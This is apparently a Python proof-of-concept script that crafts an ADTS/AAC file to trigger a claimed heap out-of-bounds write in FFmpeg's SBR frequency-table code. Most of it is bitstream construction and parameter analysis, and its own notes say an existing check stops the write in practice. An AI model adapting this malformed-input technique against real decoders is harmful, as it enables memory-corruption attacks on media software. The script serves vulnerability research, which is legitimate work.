#!/usr/bin/env python3
"""
PoC generator for VULN 001:
  Heap OOB Write via Unchecked n_master in sbr_make_f_master
  File: libavcodec/aacsbr_template.c
  Function: sbr_make_f_master()

Vulnerability analysis:
  - f_master[] is declared as uint16_t f_master[49] (sbr.h:182)
  - check_n_master() only validates n_master > 0 and bs_xover_band < n_master
  - It does NOT check n_master <= 49
  - With bs_freq_scale=1, bs_alter_scale=0, k0=1, k2=32 (192000 Hz SBR):
      num_bands_0 = 12, num_bands_1 = 48 -> n_master = 60 > 49
  - memcpy writes 60 entries to f_master[49] -> OOB by 11 entries

Trigger path:
  ADTS sr=96000 Hz -> SBR sr=192000 Hz
  SBR header: bs_start_freq=0, bs_stop_freq=9, bs_freq_scale=1, bs_alter_scale=0

NOTE: In practice, sbr_make_f_master() has an earlier validity check that catches
zero-sized frequency bands (make_bands() for k0=1, k1=2, 12 bands produces
zero-width bands, triggering "Invalid vDk0" and returning -1 before the OOB
memcpy). This check was added as a mitigation. The vulnerability description may
refer to a version where this check was absent or insufficient.

This PoC constructs the exact bitstream described and documents the behavior.
"""

import struct
import math

OUTPUT_FILE = "vuln_001_input.aac"


class BitWriter:
    """MSB-first bit packer for constructing ADTS/AAC bitstreams."""

    def __init__(self):
        self.bits = []

    def write_bits(self, value, n):
        """Write n bits of value (MSB first)."""
        for i in range(n - 1, -1, -1):
            self.bits.append((value >> i) & 1)

    def write_bit(self, value):
        self.write_bits(value, 1)

    def to_bytes(self):
        # Pad to byte boundary
        while len(self.bits) % 8 != 0:
            self.bits.append(0)
        result = bytearray()
        for i in range(0, len(self.bits), 8):
            byte_val = 0
            for j in range(8):
                byte_val = (byte_val << 1) | self.bits[i + j]
            result.append(byte_val)
        return bytes(result)

    def bit_count(self):
        return len(self.bits)


def simulate_make_bands(start, stop, num_bands):
    """Simulate FFmpeg's make_bands() to predict band sizes."""
    bands = []
    base = (stop / start) ** (1.0 / num_bands)
    prod = float(start)
    previous = start
    for k in range(num_bands - 1):
        prod *= base
        present = round(prod)  # lrintf behavior
        bands.append(present - previous)
        previous = present
    bands.append(stop - previous)
    return bands


def predict_n_master(sr_sbr, bs_start_freq, bs_stop_freq, bs_freq_scale, bs_alter_scale):
    """
    Predict n_master for given SBR parameters.
    Returns (n_master, k0, k2, would_pass_check) tuple.
    would_pass_check indicates if make_bands validity check would pass.
    """
    sbr_offset = [
        [-8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7],
        [-5, -4, -3, -2, -1,  0,  1,  2, 3, 4, 5, 6, 7, 9, 11, 13],
        [-5, -3, -2, -1,  0,  1,  2,  3, 4, 5, 6, 7, 9, 11, 13, 16],
        [-6, -4, -2, -1,  0,  1,  2,  3, 4, 5, 6, 7, 9, 11, 13, 16],
        [-4, -2, -1,  0,  1,  2,  3,  4, 5, 6, 7, 9, 11, 13, 16, 20],
        [-2, -1,  0,  1,  2,  3,  4,  5, 6, 7, 9, 11, 13, 16, 20, 24],
    ]

    if sr_sbr in [88200, 96000, 128000, 176400, 192000]:
        ptr = sbr_offset[5]
    elif sr_sbr in [44100, 48000, 64000]:
        ptr = sbr_offset[4]
    elif sr_sbr == 32000:
        ptr = sbr_offset[3]
    elif sr_sbr == 24000:
        ptr = sbr_offset[2]
    elif sr_sbr == 22050:
        ptr = sbr_offset[1]
    elif sr_sbr == 16000:
        ptr = sbr_offset[0]
    else:
        return None, None, None, False

    if sr_sbr < 32000:
        temp = 3000
    elif sr_sbr < 64000:
        temp = 4000
    else:
        temp = 5000

    start_min = ((temp << 7) + (sr_sbr >> 1)) // sr_sbr
    stop_min  = ((temp << 8) + (sr_sbr >> 1)) // sr_sbr

    k0 = start_min + ptr[bs_start_freq]

    if bs_stop_freq < 14:
        k2 = stop_min
        stop_dk = simulate_make_bands(stop_min, 64, 13)
        stop_dk_sorted = sorted(stop_dk)
        for i in range(bs_stop_freq):
            k2 += stop_dk_sorted[i]
    elif bs_stop_freq == 14:
        k2 = 2 * k0
    elif bs_stop_freq == 15:
        k2 = 3 * k0
    else:
        return None, None, None, False

    k2 = min(64, k2)

    if sr_sbr <= 32000:
        max_qmf = 48
    elif sr_sbr == 44100:
        max_qmf = 35
    else:
        max_qmf = 32

    if k2 - k0 > max_qmf or k2 - k0 <= 0:
        return None, k0, k2, False

    if bs_freq_scale == 0:
        dk = bs_alter_scale + 1
        n_master = ((k2 - k0 + (dk & 2)) >> dk) << 1
        return n_master, k0, k2, True  # linear case, no make_bands issue

    half_bands = 7 - bs_freq_scale
    two_regions = (49 * k2 > 110 * k0)
    k1 = 2 * k0 if two_regions else k2

    num_bands_0 = round(half_bands * math.log2(k1 / k0)) * 2
    if num_bands_0 <= 0:
        return None, k0, k2, False

    # Check if make_bands for region 0 would produce valid (positive) bands
    vk0_bands = simulate_make_bands(k0, k1, num_bands_0)
    vk0_ok = all(b > 0 for b in vk0_bands)

    if not vk0_ok:
        # Simulates the "Invalid vDk0" check that would return -1
        n_master_theoretical = None
        if two_regions:
            invwarp = 0.76923076923076923077 if bs_alter_scale else 1.0
            num_bands_1 = round(half_bands * invwarp * math.log2(k2 / k1)) * 2
            n_master_theoretical = num_bands_0 + num_bands_1
        return n_master_theoretical, k0, k2, False  # would fail check

    if two_regions:
        invwarp = 0.76923076923076923077 if bs_alter_scale else 1.0
        num_bands_1 = round(half_bands * invwarp * math.log2(k2 / k1)) * 2
        if num_bands_1 <= 0:
            return num_bands_0, k0, k2, True  # only one region effectively
        n_master = num_bands_0 + num_bands_1
    else:
        n_master = num_bands_0

    return n_master, k0, k2, True


def build_adts_header(sample_rate_idx, channel_config, frame_len, profile=1):
    """
    Build 7-byte ADTS header (no CRC).

    ADTS Fixed Header (28 bits):
      syncword[11:0] = 0xFFF
      ID = 0 (MPEG-4)
      layer[1:0] = 00
      protection_absent = 1 (no CRC)
      profile[1:0] = profile (1=LC)
      sampling_frequency_index[3:0]
      private_bit = 0
      channel_configuration[2:0]
      originality/copy = 0
      home = 0

    ADTS Variable Header (28 bits):
      copyright_id_bit = 0
      copyright_id_start = 0
      aac_frame_length[12:0] = frame_len
      adts_buffer_fullness[10:0] = 0x7FF (VBR)
      number_of_raw_data_blocks_in_frame[1:0] = 0
    """
    bw = BitWriter()

    # Fixed header
    bw.write_bits(0xFFF, 12)   # syncword
    bw.write_bit(0)             # ID (MPEG-4)
    bw.write_bits(0, 2)         # layer
    bw.write_bit(1)             # protection_absent
    bw.write_bits(profile, 2)   # profile (1 = LC = AAC-LC)
    bw.write_bits(sample_rate_idx, 4)  # sampling_frequency_index
    bw.write_bit(0)             # private_bit
    bw.write_bits(channel_config, 3)   # channel_configuration
    bw.write_bit(0)             # originality/copy
    bw.write_bit(0)             # home

    # Variable header
    bw.write_bit(0)             # copyright_id_bit
    bw.write_bit(0)             # copyright_id_start
    bw.write_bits(frame_len, 13)   # aac_frame_length
    bw.write_bits(0x7FF, 11)   # adts_buffer_fullness (VBR)
    bw.write_bits(0, 2)         # number_of_raw_data_blocks

    return bw.to_bytes()


def build_aac_payload(bs_start_freq, bs_stop_freq, bs_freq_scale, bs_alter_scale,
                      bs_noise_bands=2, bs_xover_band=0, fill_cnt=15):
    """
    Build the AAC raw_data_block payload containing:
      1. Minimal SCE (TYPE_SCE=000, max_sfb=0) - provides valid channel element
         so che_prev is non-NULL when the fill element is processed
      2. TYPE_FIL with EXT_SBR_DATA extension containing the crafted SBR header
      3. TYPE_END

    Bit layout:
      SCE (29 bits):
        TYPE_SCE[2:0] = 000
        instance_tag[3:0] = 0000
        global_gain[7:0] = 00000000 (any value OK since max_sfb=0)
        ics_reserved_bit = 0
        window_sequence[1:0] = 00 (ONLY_LONG_SEQUENCE)
        use_kb_window = 0
        max_sfb[5:0] = 000000 (0 bands, no data to decode)
        predictor_present = 0
        pulse_present = 0
        tns_present = 0
        gain_control = 0
        (no spectrum bits since max_sfb=0)

      TYPE_FIL (7 bits):
        TYPE_FIL[2:0] = 110
        count[3:0] = fill_cnt (bytes in fill payload)

      Extension payload (fill_cnt * 8 bits):
        extension_type[3:0] = 1101 (EXT_SBR_DATA = 0xD)
        bs_header_flag = 1
        [sbr_header bits - see SBR header construction]
        [remaining zeros for sbr_data garbage]

      TYPE_END (3 bits):
        111

      Padding to byte boundary.
    """
    bw = BitWriter()

    # --- Minimal SCE element ---
    bw.write_bits(0, 3)   # TYPE_SCE = 0b000
    bw.write_bits(0, 4)   # instance_tag = 0

    # ff_aac_decode_ics:
    bw.write_bits(0, 8)   # global_gain (any value, ignored with max_sfb=0)

    # decode_ics_info:
    bw.write_bit(0)       # ics_reserved_bit = 0
    bw.write_bits(0, 2)   # window_sequence = ONLY_LONG_SEQUENCE (0)
    bw.write_bit(0)       # use_kb_window = 0
    bw.write_bits(0, 6)   # max_sfb = 0 (no scale factor bands)
    bw.write_bit(0)       # predictor_present = 0

    # (decode_band_types: no iterations since max_sfb=0)
    # (decode_scalefactors: no iterations since max_sfb=0)
    # (decode_spectrum_and_dequant: no bits with max_sfb=0, all ZERO_BT)

    bw.write_bit(0)       # pulse_present = 0
    bw.write_bit(0)       # tns_present = 0
    bw.write_bit(0)       # gain_control = 0

    sce_bits = bw.bit_count()

    # --- TYPE_FIL element ---
    bw.write_bits(6, 3)   # TYPE_FIL = 0b110 = 6
    bw.write_bits(fill_cnt, 4)  # count (bytes in fill payload)

    # --- Extension payload (fill_cnt bytes = fill_cnt*8 bits) ---
    ext_start = bw.bit_count()

    # extension_type = EXT_SBR_DATA = 0xD = 0b1101
    bw.write_bits(0xD, 4)

    # bs_header_flag = 1 (include SBR header to trigger sbr_reset)
    bw.write_bit(1)

    # --- read_sbr_header() bits ---
    bw.write_bit(0)                      # bs_amp_res_header
    bw.write_bits(bs_start_freq, 4)      # bs_start_freq (0 -> k0 minimum)
    bw.write_bits(bs_stop_freq, 4)       # bs_stop_freq
    bw.write_bits(bs_xover_band, 3)      # bs_xover_band
    bw.write_bits(0, 2)                  # bs_reserved (skipped)
    bw.write_bit(1)                      # bs_header_extra_1 = 1 (to set freq_scale)
    bw.write_bits(bs_freq_scale, 2)      # bs_freq_scale (1..3 for log bands)
    bw.write_bit(bs_alter_scale)         # bs_alter_scale
    bw.write_bits(bs_noise_bands, 2)     # bs_noise_bands
    bw.write_bit(0)                      # bs_header_extra_2 = 0

    # Fill remaining bits of the extension payload with zeros
    ext_used = bw.bit_count() - ext_start
    ext_total = fill_cnt * 8
    remaining = ext_total - ext_used
    for _ in range(remaining):
        bw.write_bit(0)

    # --- TYPE_END ---
    bw.write_bits(7, 3)   # TYPE_END = 0b111 = 7

    return bw.to_bytes()


def main():
    # --- Trigger parameters ---
    # ADTS core sample rate: 96000 Hz (index 0)
    # SBR sample rate: 2 * 96000 = 192000 Hz
    # For 192000 Hz: start_min=3, stop_min=7, sbr_offset[5]
    # bs_start_freq=0: k0 = 3 + (-2) = 1
    # bs_stop_freq=9: k2 = 7 + sum(9 smallest stop_dk) = 32
    # bs_freq_scale=1: half_bands=6, two_regions=True, k1=2
    # num_bands_0 = round(6*log2(2/1))*2 = 12
    # num_bands_1 = round(6*log2(32/2))*2 = round(6*4)*2 = 48
    # n_master = 60 > f_master[49] -> OOB by 11 entries (THEORETICAL)
    #
    # NOTE: In practice, make_bands(1, 2, 12) produces zero-sized bands,
    # triggering the "Invalid vDk0" check and returning -1 before the memcpy.
    # This is documented in the notes file.

    ADTS_SR_IDX = 0       # 96000 Hz
    CHANNEL_CONFIG = 1    # mono
    PROFILE = 1           # LC (object type 2, profile = 2-1 = 1)

    BS_START_FREQ = 0     # k0 = 1 for 192000 Hz SBR
    BS_STOP_FREQ = 9      # k2 = 32 for 192000 Hz SBR
    BS_FREQ_SCALE = 1     # half_bands = 6, logarithmic
    BS_ALTER_SCALE = 0    # invwarp = 1.0
    BS_NOISE_BANDS = 2
    BS_XOVER_BAND = 0

    FILL_CNT = 10         # bytes in fill element payload (room for SBR header + data)
    # NOTE: 4-bit count field; value 15 is an escape code that reads extra byte.
    # Use 10 (0b1010) to avoid escape and provide enough room for SBR header.

    # Predict what will happen
    sr_sbr = 192000  # 2 * 96000
    n_master, k0, k2, passes_check = predict_n_master(
        sr_sbr, BS_START_FREQ, BS_STOP_FREQ, BS_FREQ_SCALE, BS_ALTER_SCALE
    )

    print(f"=== Vulnerability Parameter Analysis ===")
    print(f"ADTS sample rate: 96000 Hz (index 0)")
    print(f"SBR sample rate: {sr_sbr} Hz")
    print(f"k0={k0}, k2={k2}")
    print(f"Theoretical n_master={n_master}")
    print(f"f_master[] array size: 49")
    print(f"make_bands validity check would pass: {passes_check}")
    if not passes_check:
        print(f"NOTE: make_bands(k0={k0}, k1={2*k0 if k0 else 'N/A'}, num_bands=12)")
        print(f"      produces zero-sized bands -> 'Invalid vDk0' check fires -> returns -1")
        print(f"      sbr_reset() gracefully handles failure, no OOB write occurs")
    else:
        if n_master and n_master > 49:
            print(f"POTENTIAL OOB: n_master={n_master} > 49 (f_master array size)")
    print()

    # Build payload
    payload = build_aac_payload(
        BS_START_FREQ, BS_STOP_FREQ, BS_FREQ_SCALE, BS_ALTER_SCALE,
        bs_noise_bands=BS_NOISE_BANDS, bs_xover_band=BS_XOVER_BAND,
        fill_cnt=FILL_CNT
    )

    # ADTS frame length = 7 (header) + len(payload)
    frame_len = 7 + len(payload)

    # Build ADTS header
    header = build_adts_header(ADTS_SR_IDX, CHANNEL_CONFIG, frame_len, PROFILE)

    # Assemble complete ADTS frame
    frame = header + payload

    print(f"ADTS frame: {len(frame)} bytes")
    print(f"  Header: {header.hex()}")
    print(f"  Payload: {payload.hex()}")
    print()

    # Write multiple frames to ensure the decoder sees the stream
    num_frames = 3
    with open(OUTPUT_FILE, 'wb') as f:
        for _ in range(num_frames):
            f.write(frame)

    print(f"Written {num_frames} ADTS frames to {OUTPUT_FILE}")
    print(f"Total file size: {num_frames * len(frame)} bytes")
    print()
    print("Run with:")
    print(f"  ffmpeg -i {OUTPUT_FILE} -f null -")


if __name__ == '__main__':
    main()
